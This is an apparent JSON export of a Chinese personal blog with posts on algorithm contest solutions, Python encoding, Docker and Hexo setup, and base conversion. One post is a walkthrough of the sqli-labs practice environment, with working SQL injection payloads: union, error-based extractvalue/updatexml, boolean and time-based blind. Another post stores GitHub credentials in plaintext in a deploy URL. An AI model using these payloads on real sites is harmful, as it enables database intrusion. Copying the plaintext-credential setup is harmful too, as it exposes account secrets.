牛妹在和牛牛玩扔骰子，他们的游戏规则有所不同；每个人可以扔nn次mm面骰子，来获得nn个数得分为任意选取nn个数中的某些数求和所不能得到的最小的正整数得分大的人获胜例如扔骰子3次得到了 1 2 5，那么这个人的得分是4牛妹想知道这回合她是否能赢具体看链接吧 思路我们使用一个模拟的思路去思考，对某数组排序后，然后从1开始，看看是否可以通过数组里的元素去求和得到，假设以上帝视角知道m+1是那个最小的正整数，那么m是可以通过数组的子集里的元素得到的这一串连续数里的最大正整数，问题的关键就是我们如何得到m，如何得到这个数组的子集。假如再给这个数组子集添加一个元素，那么这个元素一定是大于m+1的，因为如果等于m+1，那么m+1也可以通过数组的某些元素得到了，与上帝视角冲突，如果小于m+1，那么与之前的和为{1~m}的某个和一定可以得到和为m+1，与上帝视角冲突。所以这个数组的求的方法就是排列后的数组，某个元素的大小大于前面的元素的和+1，这时就可以求到m和m+1。 代码1234567891011121314151617181920class Solution: def Throwdice(self, n, m, a, b): a.sort() b.sort() a_sum, b_sum = 0, 0 for i in a: if(i&gt;a_sum+1):break a_sum+=i a_sum+=1 for i in b: if(i&gt;b_sum+1):break b_sum+=i b_sum+=1 if (a_sum &gt; b_sum): return 'Happy' else: return 'Sad'","tags":[{"name":"贪心算法","slug":"贪心算法","permalink":"https://makerdd.github.io/tags/%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/"}]},{"title":"从a bytes-like object is required...错误中学习Python编码","date":"2020-03-16T16:00:00.000Z","path":"从a bytes-like object is required...错误中学习Python编码/","text":"问题发现在学习socket编程时，遇到这样一个报错，意思是需要一个字节流的对象，而不是str。 1a bytes-like object is required, not &#39;str&#39; 我们知道在网络传输中，数据是以二进制的方式进行传输的，报这个错大概就是你这个东西不是二进制，而是“文本”，我不能进行传输。解决方案也很简单，只需要在传输的信息后面加上.decode(“…”)，就可以使用某种编码方式进行传输了。当时越想越蒙，Python里的“文本”是什么格式，Python2和Python3貌似是什么不同来着，感觉自己的基本功太欠缺，编码方面的事情没有搞懂。 Python2和Python3在网上的资料中，Python2的字符串有两种类型：str和unicode，str是属于字节流类型，默认的编码方式是ascii，所以Python2中脚本第二行，一般会写上用utf-8编码，否则中文及其它一些符号是不能显示的。到了Python3字符串就只有unicode类型了，unicode是什么？Unicode（中文：万国码、国际码、统一码、单一码）是计算机科学领域里的一项业界标准。它对世界上大部分的文字系统进行了整理、编码，使得电脑可以用更为简单的方式来呈现和处理文字。-来自维基百科可以这样理解，unicode是一个非常大的表格，它对世界上的字符都进行了编码，每个字符都有自己的代号，可以查看这个链接，是中文的unicode编码。那utf-8又是什么？首先unicode编码只是对字符进行了编码，比如令的编码是4EE4,但它并没有说这个字存储时怎么存，utf-8的意义就是规定了它的存储方式，再比如令存储为\\xe4\\xbb\\xa4，具体可以查看utf-8是以什么规则进行存储的。在Python3中，编码方式就是utf-8了，我们的代码，文本文件操作时会以这种编码方式。 审视问题回过头来看一下这个问题，我们就知道是怎么回事了。比如我们想传输一句话：你好，世界。这在Python中是以unicode方式进行存储，这样当然不能通过网络传输了，所以需要s.encode(‘utf8’)，当然不写utf8,也是默认使用的utf8，这样我们的话就可以顺着网线传输过去，对方接收时，也用utf8进行解码就可以，即.decode(‘utf8’)。如果我们发送的是纯英文，使用ascii编码就可以完成传输和接收的任务。 总结到这里基本上就大致讨论完Python的编码方式了，在Windows和Linux上还有一些不同，所以最好显示指定编码方式和解码方式。总而言之，一个unicode编码的字符有encode方法，你可以把它用任何格式进行编码；一个二进制类型的数据，你可以使用decode方法，通过相应的解码方式，去看到它的字符含义。 参考链接字符编码笔记：ASCII，Unicode 和 UTF-8Python 编码为什么那么蛋疼？","tags":[]},{"title":"Docker搭建Hexo博客","date":"2020-03-13T16:00:00.000Z","path":"Docker搭建Hexo博客/","text":"选择Docker在本地搭建Hexo博客，第一会造成本地环境的紊乱，第二迁移的时候比较麻烦，在Docker中搭建Hexo博客就可以完美解决这两个问题。 编写Dockerfile12345678910111213141516171819202122232425262728293031323334FROM node:12-alpine#基于alpine的node镜像，这样就不用下载node了WORKDIR /Blog#工作区在/Bolg，接下来的命令和语句都是在/Blog下执行的RUN echo \"Asia/Shanghai\" &gt; /etc/timezone \\ &amp;&amp; echo \"https://mirrors.ustc.edu.cn/alpine/v3.9/main/\" &gt; /etc/apk/repositories \\ &amp;&amp; npm config set registry https://registry.npm.taobao.org \\ &amp;&amp; apk add --no-cache git \\ &amp;&amp; npm install hexo-cli -g \\ &amp;&amp; hexo init \\ &amp;&amp; npm install \\ &amp;&amp; npm install hexo-deployer-git --save \\ &amp;&amp; npm install hexo-generator-json-content@2.2.0 --save \\ &amp;&amp; npm install hexo-renderer-jade@0.3.0 --save \\ &amp;&amp; npm install hexo-renderer-stylus --save \\ &amp;&amp; rm -rf source themes \\ &amp;&amp; git config --global user.email \"your mail\" \\ &amp;&amp; git config --global user.name \"your name\" #以上都是在安装配置git和Hexo，使用hexo-deployer-git插件推送到远端，#另外三个插件是我选的主题所需要的，可以不安装ADD themes ./themesADD _config.yml ./#将主题文件夹拷贝到镜像中，主配置文件拷贝到镜像中，这些都是在宿主机中配置好EXPOSE 5000#暴露5000端口，Hexo server在Docker中是4000,但主机的4000端口貌似经常被占用ENTRYPOINT [\"hexo\", \"clean\"] ENTRYPOINT [\"hexo\", \"g\"] ENTRYPOINT [\"hexo\", \"d\"] #每次run的时候自动执行的语句 对Dockerfile的编写不是很熟悉，后续再优化。 执行1sudo docker run --volume ~/Blog/source:/Blog/source --rm blog-hexo 执行的时候，用到Docker的volume映射，将你宿主机的文章所在的文件夹与Docker的文章所在的文件夹进行同步，然后–rm意思是，当该容器结束运行时，清理映射文件等等，blog-hexo是创建的镜像名称，只需一步就可以进行生成，推送。主配置文件中的git推送方法是使用我之前介绍的一种方法，详见Hexo关联github–https 写在后面有了Docker之后，我们只需要保存我们的文章，主题，配置文件即可，带来了很大的便利，后面会继续研究Docker的使用及原理。","tags":[]},{"title":"ccf--201703-3Markdown--python","date":"2020-02-28T02:41:00.000Z","path":"ccf-201703-3Markdown-python/","text":"测试情况语言:python得分：100耗时：62ms空间使用：9.363MB 思路这道题也是属于模拟题，并不是有多难考虑，而是是否考虑的周到。首先处理行内内容，因为是区块都有可能包括着重和链接，所以每句话都处理一下即可，使用正则里的sub模块最为方便。其次title格式的最容易实现，因为输出就一行，可以在这一步里就完成。然后需要分析一下无序列表和段落，这来两个都有可能连续多行，段落是在在两头加&lt;p&gt;&lt;/p&gt;,这两个并不独占一行，无序列表则是在两头加上&lt;ul&gt;&lt;/ul&gt;，这两个都要独占一行，然后通过阅读题目，发现每个区块之间是以空行相隔，这样我们就可以把行尾的问题交给空行去处理，其余的每行只要控制好该行的格式即可。 代码实现其实是可以用%来格式化输出的，由于不知道ccf的python3是什么版本，采用了format，后面尝试了一下%格式控制，也是满分的。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566import redef deal_title(s,title_flag,list_flag,page_flag): s,num = re.subn('#','',s) s = s.lstrip() return (\"&lt;h&#123;0&#125;&gt;\".format(num)+s+\"&lt;/h&#123;0&#125;&gt;\".format(num),1,0,0)def deal_list(s,title_flag,list_flag,page_flag): s = re.sub('\\*','',s) s = s.lstrip() if(list_flag == 1): return (\"&lt;li&gt;\" + s + \"&lt;/li&gt;\\n\",0,1,0) else: return (\"&lt;ul&gt;\\n&lt;li&gt;\" + s + \"&lt;/li&gt;\\n\",0,1,0)def deal_page(s,title_flag,list_flag,page_flag): if(page_flag == 0): return (\"&lt;p&gt;\" + s,0,0,1) else: return (\"\\n\" + s,0,0,1)def deal_blank(title_flag,list_flag,page_flag): s = '' if(title_flag == 1): s = \"\\n\" elif(list_flag == 1): s = \"&lt;/ul&gt;\\n\" elif(page_flag == 1): s = \"&lt;/p&gt;\\n\" return (s,0,0,0)if __name__ == '__main__': title_flag = 0 list_flag = 0 page_flag = 0 raw = '' new = '' while True: try: s = input() s = re.sub(\"_(.*?)_\", \"&lt;em&gt;\\g&lt;1&gt;&lt;/em&gt;\", s) # 处理着重 s = re.sub(\"\\[(.*?)\\]\\((.*?)\\)\", '&lt;a href=\"\\g&lt;2&gt;\"&gt;\\g&lt;1&gt;&lt;/a&gt;', s) #处理链接 raw += (s+'\\n') except: break raw_list = raw.split('\\n') for i in raw_list: if(i == ''): s_temp,title_flag,list_flag,page_flag = deal_blank(title_flag,list_flag,page_flag) new += s_temp ## 标题处理 elif(i[0] == '#'): s_temp,title_flag,list_flag,page_flag = deal_title(i,title_flag,list_flag,page_flag) new += s_temp ## 无序列表处理 elif(i[0] == '*'): s_temp, title_flag, list_flag, page_flag = deal_list(i, title_flag, list_flag, page_flag) new += s_temp ## 段落处理 else: s_temp, title_flag, list_flag, page_flag = deal_page(i, title_flag, list_flag, page_flag) new += s_temp if(page_flag == 1): new += '&lt;/p&gt;' if(list_flag == 1): new += '\\n&lt;/ul&gt;' print(new)","tags":[]},{"title":"ccf--201912-3化学方程式--python","date":"2020-02-27T08:42:28.000Z","path":"201912-3化学方程式-python/","text":"答题情况这道题只拿了70分，剩余的30分提示错误，但我也没琢磨明白什么情况没有考虑到。 思路首先从”=”两边分开，以左边的为例，再从”+”分开，逐个分析化学式，左右两边各用一个字典来存储元素个数，最后比较字典是否相同。以这个为例：Ca(OH(CH)2)2A3=CaA3O2H6C5主要使用到正则表达式，首先字符串为Ca(OH(CH)2)2A3，取最前面的系数，没有则为1，这里确实没有系数，字符串不变，然后依次检查左括号，右括号，单字母元素，双字母元素，这里匹配到了Ca，而且他前面没有括号，后边没有数字(匹配括号和元素都会匹配后面的数字)，所以就直接在字典里存储dict[‘Ca’]+=最前面系数*元素后面的系数，这里均为1，然后游标加上匹配到的长度，字符串变为(OH(CH)2)2A3，接下来会匹配到’(‘,这时左括号数量加1，如果左括号后边有数字的话，也会保存在一个列表里，继续进行匹配，直到匹配到CH)2)2A3，匹配到C这个元素时，因为他前面有两个括号，我们不能把他放入字典中，把他的信息放入一个列表里，(元素名称，元素后面的系数，左括号数量-右括号数量)，比如C这个元素，前面有两个左括号，没有右括号，所以应该与前面两个右括号里的数字相乘，这里我们也保存了右括号里的数字。等到字符串遍历完，就可以去处理括号里的元素了。右边的化学式也是这样处理。代码写的比较啰嗦，没有用函数封装，只需要看左边如何处理就行，右边的是copy左边的，只是换了一下字典。等有时间，优化一下代码，思考剩下三十分如何回事。有什么问题，欢迎大佬敬请指出。 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147import refrom collections import defaultdictfrom functools import reducenum = int(input())coeff_num_pattern = re.compile('\\d*')left_bracket_pattern = re.compile('(\\()(\\d*)')right_bracket_num_pattern = re.compile('(\\))(\\d*)')single_ele_num_pattern = re.compile('([A-Z])(?![a-z])(\\d*)')double_ele_num_pattern = re.compile('([A-Z][a-z])(\\d*)')for j in range(num): s = input() dic_l = defaultdict(lambda: 0) dic_r = defaultdict(lambda: 0) s_l, s_r = s.split('=') s_l = s_l.split('+') s_r = s_r.split('+') for ele in s_l: coeff_num = coeff_num_pattern.match(ele) cur = 0 left_bracket_cnt = 0 right_bracket_cnt = 0 left_bracket_num_lst = [] right_bracket_num_lst = [] ele_bracket_lst = [] if((coeff_num.span()[1] - coeff_num.span()[0]) != 0): cur += coeff_num.span()[1] coeff_num = int(coeff_num.group()) else: coeff_num = 1 while(ele[cur:] != ''): if(left_bracket_pattern.match(ele[cur:])): left_bracket_cnt += 1 temp = left_bracket_pattern.match(ele[cur:]) if(temp.group(2)): left_bracket_num_lst.append(int(temp.group(2))) else: left_bracket_num_lst.append(1) cur += temp.span()[1] elif(right_bracket_num_pattern.match(ele[cur:])): right_bracket_cnt += 1 temp = right_bracket_num_pattern.match(ele[cur:]) if(temp.group(2)): right_bracket_num_lst.append(int(temp.group(2))) else: right_bracket_num_lst.append(1) cur += temp.span()[1] elif(single_ele_num_pattern.match(ele[cur:])): temp = single_ele_num_pattern.match(ele[cur:]) single_ele = temp.group(1) if(temp.group(2)): single_ele_num = int(temp.group(2)) else: single_ele_num = 1 cur += temp.span()[1] if(left_bracket_cnt &gt; right_bracket_cnt): ele_bracket_lst.append([single_ele,single_ele_num,left_bracket_cnt-right_bracket_cnt]) else: dic_l[single_ele] += coeff_num*single_ele_num elif(double_ele_num_pattern.match(ele[cur:])): temp = double_ele_num_pattern.match(ele[cur:]) double_ele = temp.group(1) if(temp.group(2)): double_ele_num = int(temp.group(2)) else: double_ele_num = 1 cur += temp.span()[1] if(left_bracket_cnt &gt; right_bracket_cnt): ele_bracket_lst.append([double_ele,double_ele_num,left_bracket_cnt-right_bracket_cnt]) else: dic_l[double_ele] += coeff_num*double_ele_num for k in ele_bracket_lst: dic_l[k[0]] += coeff_num * k[1] * reduce(lambda x,y:x*y,right_bracket_num_lst[::-1][:k[2]]) * reduce(lambda x,y:x*y,left_bracket_num_lst[::-1][:k[2]]) for ele in s_r: coeff_num = coeff_num_pattern.match(ele) cur = 0 left_bracket_cnt = 0 right_bracket_cnt = 0 right_bracket_num_lst = [] ele_bracket_lst = [] if ((coeff_num.span()[1] - coeff_num.span()[0]) != 0): cur += coeff_num.span()[1] coeff_num = int(coeff_num.group()) else: coeff_num = 1 while (ele[cur:] != ''): if (left_bracket_pattern.match(ele[cur:])): left_bracket_cnt += 1 temp = left_bracket_pattern.match(ele[cur:]) if (temp.group(2)): left_bracket_num_lst.append(int(temp.group(2))) else: left_bracket_num_lst.append(1) cur += temp.span()[1] elif (right_bracket_num_pattern.match(ele[cur:])): right_bracket_cnt += 1 temp = right_bracket_num_pattern.match(ele[cur:]) if (temp.group(2)): right_bracket_num_lst.append(int(temp.group(2))) else: right_bracket_num_lst.append(1) cur += temp.span()[1] elif (single_ele_num_pattern.match(ele[cur:])): temp = single_ele_num_pattern.match(ele[cur:]) single_ele = temp.group(1) if (temp.group(2)): single_ele_num = int(temp.group(2)) else: single_ele_num = 1 cur += temp.span()[1] if (left_bracket_cnt &gt; right_bracket_cnt): ele_bracket_lst.append([single_ele, single_ele_num, left_bracket_cnt - right_bracket_cnt]) else: dic_r[single_ele] += coeff_num * single_ele_num elif (double_ele_num_pattern.match(ele[cur:])): temp = double_ele_num_pattern.match(ele[cur:]) double_ele = temp.group(1) if (temp.group(2)): double_ele_num = int(temp.group(2)) else: double_ele_num = 1 cur += temp.span()[1] if (left_bracket_cnt &gt; right_bracket_cnt): ele_bracket_lst.append([double_ele, double_ele_num, left_bracket_cnt - right_bracket_cnt]) else: dic_r[double_ele] += coeff_num * double_ele_num for k in ele_bracket_lst: dic_r[k[0]] += coeff_num * k[1] * reduce(lambda x,y:x*y,right_bracket_num_lst[::-1][:k[2]]) * reduce(lambda x,y:x*y,left_bracket_num_lst[::-1][:k[2]]) worng_flag = 0 if (len(dic_l) != len(dic_r)): print('N') worng_flag = 1 else: for i in dic_l: if (i not in dic_r): print('N') worng_flag = 1 break else: if (dic_l[i] != dic_r[i]): print('N') worng_flag = 1 break if (worng_flag == 0): print('Y')","tags":[{"name":"ccf csp","slug":"ccf-csp","permalink":"https://makerdd.github.io/tags/ccf-csp/"}]},{"title":"ccf--201703-2学生排队--python","date":"2020-02-27T08:23:42.000Z","path":"201703-2学生排队-python/","text":"题目名称：学生排队题目链接：http://118.190.20.162/view.page?gpid=T56 思路使用两个字典，一个是学号映射到位置的字典，另一个是位置映射到学号的字典，通过查询和更新字典，完成学生的排队。 代码实现12345678910111213141516171819202122232425262728293031323334#先通过学号，查询位置，看应该向哪里移动，然后两个字典的都要进行修改#如果是向前移动，前面的若干人，位置减1，同时位置上的学号进行改变#如果是向后移动，后面的若干人，位置加1，同时位置上的学号进行改变loc2no = &#123;&#125;no2loc = &#123;&#125;stu_no = int(input())num = int(input())loc2no = &#123;i:i for i in range(1,stu_no+1)&#125;no2loc = &#123;i:i for i in range(1,stu_no+1)&#125;for i in range(num): no,move = map(int,input().split()) if(move &gt; 0): #向后移动 loc = no2loc[no] for j in range(loc,loc+move): loc2no[j] = loc2no[j+1] no2loc[loc2no[j]] = j loc2no[loc+move] = no no2loc[no] = loc + move if (move &lt; 0): # 向前移动 loc = no2loc[no] for j in range(loc, loc + move,-1): loc2no[j] = loc2no[j - 1] no2loc[loc2no[j]] = j loc2no[loc + move] = no no2loc[no] = loc + moven = 1for i in loc2no: if(n &lt; stu_no): print(loc2no[i],end=' ') else: print(loc2no[i],end='') n += 1","tags":[{"name":"ccf csp","slug":"ccf-csp","permalink":"https://makerdd.github.io/tags/ccf-csp/"}]},{"title":"sqli-labs思路","date":"2020-02-18T12:33:41.000Z","path":"sqli-labs思路/","text":"前言sql注入是web渗透的重要技能，印度有一位安全小哥搭建了一个sql注入的环境，里面有各种题目，相当于解题闯关，其github地址：https://github.com/Audi-1/sqli-labs ，由于里面用到的是php5，Apache2，mysql，不想破坏本地的环境，于是决定在Docker上搭建实验环境。 环境搭建刚开始想自己搭建一个环境，由于对Docker不熟悉，最后作罢，使用Docker Hub别人搭建好的sqli-labs的环境。首先安装Docker，然后把环境拉下来， 1docker pull acgpiano/sqli-labs 这是sqli-labs环境的镜像已经下载到本地了，接下来就可以启动了。sqli-labs是以网页的形式呈现在我们面前的，所以容器中是开启了Apache服务的，一般默认是80端口；其次，sqli-labs作者已经把数据库写好了，我们要是想查看数据库内容的话，为了更清楚的学习，可以把mysql服务的端口也映射出来，这里说一下，Docker里面提供的服务是通过端口映射来映射到宿主机的。接下来启动镜像，生成一个容器， 1234docker run -dt --name sqli -p 80:80 -p 13306:3306 --rm acgpiano/sqli-labs #dt和rm这两个参数我也没搞懂，等懂了再填坑#name指的是启动的容器的名称#p指的是启动的端口，映射了两个端口，一个是Apache服务的，一个是mysql服务的，#13306是宿主机端口，3306是容器中的端口 进入环境运行之后只要在浏览器中键入localhost一般会自动跳转到环境界面，先点击创建数据库，然后就可以进入到题目中。如果想连接数据库的话，我用的是workbench，连接的地址是127.0.0.1，端口是设置的宿主机端口，密码为空，这样就可以连接到数据库了。后面会写一些关于sql注入的一些知识和做题的思路，把基本打扎实才是硬道理。 第一关第一关属于单引号注入，很容易尝试出来，但是我有一点不理解的是输入错误的id为什么还可以返回正确的结果，应该是php过滤方面的问题，等学习了再填坑。如图所示：图中我加了sql语句显示便于初期学习，当id为2as时也可以正确显示。 第二关这一关是属于整形注入，当我们在id后面添加单引号时，观察报错信息，the right syntax to use near ‘’ LIMIT 0,1’ at line 1，从这里可以看出单引号和后面的语句爆了错，简单猜测，就是sql语句中不包含引号，回显出sql语句SELECT * FROM users WHERE id=2’ LIMIT 0,1 故此关注入可以直接进行union查询。 第三关在URL后面加上一个斜杠http://localhost/Less-3/?id=2\\，观察报错信息，syntax to use near ‘ ‘2&#39;) LIMIT 0,1 ‘ at line 1，最外面的一对单引号是mysql报错时加上的，不用看，我们的参数2\\是被单引号和一个右括号包括，可以猜测，需要闭合单引号和括号，经实践确实如此，使用–+将后面的单引号和右括号注释掉， 1http://localhost/Less-3/?id=2') and 0 union select 1,version(),2 --+ 回显出来的sql语句 1SELECT * FROM users WHERE id=('2') and 0 union select 1,version(),2 -- ') LIMIT 0,1 第四关模仿第三关先使用单引号闭合，发现并没有报错，然后换一下双引号，报了一个这样的错误： 1syntax to use near ' \"1\"\") LIMIT 0,1 ' at line 1 可以看出这个是双引号和括号来进行闭合，只要在右边加上双引号和右括号即可。 1http://localhost/Less-4/?id=1\") and 0 union select 1,version(),3 --+ 观察一下回显的sql语句，和猜测的一样。 1SELECT * FROM users WHERE id=(\"1\") and 0 union select 1,version(),3 -- \") LIMIT 0,1 看了一下php的源码，构造是这样的： 12$id = ' \" ' . $id . ' \" ';$sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\"; 先在传入的id两边加上了双引号，然后又在传的sql语句中加上了括号，加入传入的是1,最后应是这样： 1id = (\"1\") 那我们加入单引号应该是这样的 1id = (\" 1' \") 这样mysql也是可以正常解析出来的，这是由于mysql的隐式转换的问题，我博客里写了一篇关于隐式转换的说明，可以参考一下。 总结通过这四关的基础练习，感觉自己在一些方面还需要深入研究，例如PHP的mysql连接部分，mysql报错源码之类的，这样更有利于分析sql注入。 第五关当我们输入一个可以查询到的id时，会显示you are in………,当把id设置为10000时，什么都不显示，通过加单引号，根据报错信息，可以看到是单引号包括的字符型，因为信息不会回显到浏览器上，所以可以尝试一下，利用报错信息，来获取我们想要的信息。常用的函数有这两个： extractvalue(XML_document,XPath_string)从目标XML中返回包含所查询值的字符串，该方法只能爆出32位。 updatexml(XML_document,XPath_string,new_value)改变文档中符合条件的值这两个函数都是和XML相关的，因为我们的XPath语句是肯定错误的，所以会告诉我们XPath里哪里不符合语法规范，这样就拿到了数据信息。 首先可以查询一下当前使用的是哪个数据库 1http://localhost/Less-5/?id=3' union select 1,extractvalue(1,concat(0x7e,(select database()),0x7e ) )--+ 返回结果是security数据库 查询该数据库下都有哪些字段 1http://localhost/Less-5/?id=3' union select 1,extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema = database() limit 0,1),0x7e ) )--+ 会返回第一个字段’id’后面就可以尝试去获取了。 第六关第六关和第五关的区别就是，第六关使用的是双引号包括id字段，改单引号为双引号即可。 第七关这关显示就两个状态：You are in…. Use outfile…… 正确状态You have an error in your SQL syntax 错误状态显然不能再使用5,6关的根据sql错误信息注入了。当加入单引号会报错，加入双引号不会报错，说明id被单引号包括，因为单引号里可以有双引号，我们使用单引号与注释进行闭合，但是不行的，说明除了单引号外还有其他符号，经实验还有两个))，这样就可以实现闭合，在后面加上我们的sql语句。接下来就要进行布尔盲注了，其意思就是根据这两种状态去测试我们查询的信息正确与否。构造一个测试： 1http://localhost/Less-7/?id=12')) and left(database(),1)='s'--+ 查看返回数据的数据库第一个字母是否为’s’，当然这个数据库是security，结果为真，显示的自然是正确状态，可以接着测试第二个，第三个字母。测试方法有以下几种：使用大于号二分法测试，迅速锁定字母；使用brpsuite暴力破解；社区版的只有单线程，而且我尝试破解了一下，返回的大小值都相同，但查看response发现是不同的，难道是社区版的问题？疑问：database()和select database()的区别 第八关单引号无返回，双引号有返回，说明是单引号包括的，单引号和注释可以正确返回，就可以直接用第七关的方法，逐个去验证了。 第九关这个只要输上id就会显示you are in………，没有报错，没有其他的显示，需要借助另外一种新的注入方法，时间盲注。时间盲注的原理就是利用sleep(n)函数，让数据库查询时睡眠上几秒。 1http://localhost/Less-9/?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+ 判断返回的使用数据库的首字母是否为’s’，是的话返回1，不是的话返回sleep(5)，通过浏览器的响应时间就可以判断是否猜对了。当然大部分时间都是猜错的，每次猜错都耗费5秒未必太浪费时间，改一下sql语句。 1http://localhost/Less-9/?id=1' and ascii(substr(database(),1,1))=115 and sleep(5)--+ 这样只有猜对了才会睡眠5秒钟。 第十关与第九关唯一不同的是单引号变成了双引号。 第十一关此关卡是一个post注入，参数不是在url里，提交的参数有这三个 1uname&#x3D;uname&amp;passwd&#x3D;passwd&amp;submit&#x3D;Submit 回显sql语句,观察一下是否可以注入 1execute sql:SELECT username, password FROM users WHERE username='admin' and password='admin' LIMIT 0,1 这里只是匹配用户名和密码的匹配，两个同时对的时候，数据库里就会显示出信息，PHP里也是这样判断的，不为空即可进行下面操作。 123$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row) 这样就可以利用前端的回显来获取数据库里的信息了。构造语句 1uname=a' union select 1,version() --+&amp;passwd=a&amp;submit=Submit 这样就可以获取到信息了。 第十二关与第十一关基本一样，构造变成了(“”)，其余思路相同。 第十三关是个post传参，在bp中测试sql语句，sql语句有回显报错，最后可以尝试出是(‘xxx’)这样包括的，对sql语句进行闭合。之后利用xpath报错注入或者布尔盲注都可。报错注入查询数据库版本： 1uname=admin') union select updatexml(1,concat(0x7e,(select version()),0x7e),1)--+&amp;passwd=admin&amp;submit=Submit 第十四关和十三关的区别是这里变成了双引号注入。 第十五关单引号注入，没有错误显示，只有使用布尔盲注或者时间盲注。 1uname&#x3D;hhh&#39; or left(database(),1)&#x3D;&#39;s&#39; --+&amp;passwd&#x3D;&amp;submit&#x3D;Submit 第十六关“)注入，多试几下就可以试出来，与十五关类似，布尔盲注。","tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://makerdd.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"Python进制转换","date":"2020-02-13T10:03:02.000Z","path":"进制转换/","text":"二进制表示 n2 = 0B11101 八进制表示 n8 = 0O127 十六进制表示 n16 = 0XF15 十进制转化为二进制1234bin(120)#转化结果是个字符串print(bin(1)+bin(2))&gt;&gt;&gt;0b10b10 #输出为字符串相加 二进制转换为十进制1int('10010',2) 十六进制转换为十进制1int('FFA',16) 十进制转化为十六进制1hex(123) 十六进制转化为二进制1bin(0XF01A) 二进制转化为十六进制1hex(0B100010) 十进制转化为八进制1oct(123) 八进制转化为十进制1int('17',8) 总结：bin,oct,int,hex分别表示把一个任意进制的数转换为二进制，八进制，十进制，十六进制。bin,oct,hex转换时，参数要带有0B，0O，0X；使用int时，可以不带，第二个参数注明待转换的参数是什么进制。","tags":[]},{"title":"deepin下安装Python环境","date":"2020-02-12T07:07:24.000Z","path":"deepin下安装Python环境/","text":"deepin环境deepin自带的是Python3.5和Python2.7，为了不更改系统环境，准备再装一个Python3.6，而且apt安装，3.6版本好像还没有放入仓库，于是在官网上找到对应版本的包，下载速度挺慢的，我把下载的分享到百度云了，有需要的朋友可以下载。链接: https://pan.baidu.com/s/145uvYjz1b-XFOTAsFGiYwA 提取码: k4ji Python安装网上介绍的大多把Python安装在/usr/local目录下，我刚开始也是这样安装的，然后发现处处需要管理员权限，于是重新安装在家目录下，毕竟也只是学习的工具，应该可以安装在家目录下。 解压将压缩包解压，然后进入解压后的文件夹。 1tar xfz 对应Python包 进入到解压文件夹1cd 对应的文件夹 添加配置1./configure --prefix=该文件夹绝对路径 这个配置是为了让装的所有东西都装在这个文件夹里，方便管理和查找。 编译源码1sudo make 执行安装1sudo make install 到这时候，安装就结束了，接下来需要进行系统配置。 后续配置1.首先创建软连接进入Python安装目录的bin目录下，里面有Python的执行脚本，Python3或者Python3.6或者Python三者是一样的，均可以创建软链接，把软连接创建在/use/bin/python36目录下，建议用python36，因为本身环境里还有一个Python3.5，同理pip也创建一个软链接。 1sudo ln -s Python脚本所在目录 /usr/bin/python36 2.使用pipenv管理虚拟环境pipenv是requests作者的另一个作品，褒贬不一，看个人喜好，首先安装pipenv，这里要使用这个命令 1pip install --user pipenv 因为我们Python安装在家目录下，是没有权限把第三方包装在系统目录下的，加上–user就是用户使用的意思。这时会在家目录下的.local/bin目录下生成pipenv的执行脚本，把这个加入到环境变量，就可以使用pipenv来创建虚拟环境了。在.profile文件尾部加入， 1export PATH=$PATH:/home/用户名/.local/bin 需要注销一下，后面会介绍一些pipenv的常用命令。","tags":[{"name":"系统配置","slug":"系统配置","permalink":"https://makerdd.github.io/tags/%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/"}]},{"title":"Hexo关联github--https","date":"2020-02-12T06:27:50.000Z","path":"Hexo关联github-https/","text":"简介Hexo搭建的博客可以在github提供的page服务进行展示，相当于本地文件部署到互联网，Hexo有个插件hexo-deployer-git可以简化一些git操作，只需要我们在根目录下的配置文件里写入配置就行。 github部署方式通过git工具向github部署文件有两种方式，第一种是https，第二种是ssh。通过https方式只需输入账号和密码，加密之类的事情由系统来完成。通过ssh方式需要在本地生成私钥和公钥，把公钥配置在github账号里。我是通过https方式来连接github的，具体配置方法如下。在主目录下的_config.yml文件里填入下面信息：其中的repo是打开你的博客的仓库，然后点击Clone，方式一定要是https， 1234deploy: type: git repo: https://github.com/Makerdd/Makerdd.github.io.git branch: master 在命令行中键入hexo d之后，输入用户名，密码就可以实现部署了。 免密部署当部署了几次之后，会发现每次都要输入用户名、密码，实在是太麻烦了，网上大多数git免密部署都是针对git的，我试了几个，对于hexo-deployer-git好像不起作用。参考知乎上一个做法，可以实现免密部署，依然打开上面那个文件，只需要改动repo，变动如下。 1234deploy: type: git repo: https://username:password@github.com/Makerdd/Makerdd.github.io.git branch: master 再次部署就会发现可以不用输入账号密码了，当然这样问题也是有的，账号密码明文保存了，后面我会介绍ssh方式推送。 参考资料:https://www.zhihu.com/question/38219432","tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://makerdd.github.io/tags/Hexo/"},{"name":"git","slug":"git","permalink":"https://makerdd.github.io/tags/git/"}]},{"title":"Hexo配置<一>","date":"2020-02-11T16:00:00.000Z","path":"Hexo配置-一/","text":"设置分类新建分类page 1hexo new page categories 进入categories文件夹，打开index.md文件，添加 1type: categories 写博客时，这样可以实现把博客分在哪一类下面 12345---title: Hello Worldcategories: - pythton--- hexo不支持多个同级分类，采用下列写法，会将该文章属于Python类，Python类又属于编程语言类。 123categories: - 编程语言 - Python 想要多个同级分类，应该这样写，这样一篇文章既属于机器学习，又属于数据处理，而这两个类是并列关系。这个来自于官方文档介绍,但我实验了一下，好像两个做法都可以。 123categories: - [机器学习] - [数据处理] 设置标签新建标签page 1hexo new page tags 进入tags文件夹，打开index.md文件，添加 1type: tags 写博客时，这样可以实现给博客加上标签 12345---title: Hello Worldtags: - 字典总结--- 设置链接格式根文件下的_config.yml中的permalink字段。 新建博客1hexo new [layout] &lt;title&gt; layout 存储路径 说明 post source/_post 默认，可以直接发布 page source 在source下新建一个文件夹 draft source/_drafts 新建文件将保持到_drafts中 本地启动hexo默认是4000端口，但是4000端口总是莫名被占用，需要手动更换端口，太麻烦，写入配置里，把启动端口改为5000. 1234server: port: 5000 compress: true header: 